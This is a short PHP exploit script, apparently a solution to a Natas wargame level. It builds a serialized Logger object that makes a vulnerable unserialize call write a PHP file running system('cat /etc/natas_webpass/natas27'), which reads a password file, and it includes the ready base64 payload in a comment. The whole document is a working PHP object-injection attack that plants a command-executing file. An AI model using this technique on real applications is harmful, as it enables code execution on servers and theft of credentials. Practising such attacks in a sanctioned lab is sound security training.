<?php

    class Logger {
        private $logFile = "img/hello_friend.php";
        private $initMsg = "";
        private $exitMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
    }

    $logger = new Logger;

    print(base64_encode(serialize($logger)));

    // Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoiaW1nL2hlbGxvX2ZyaWVuZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30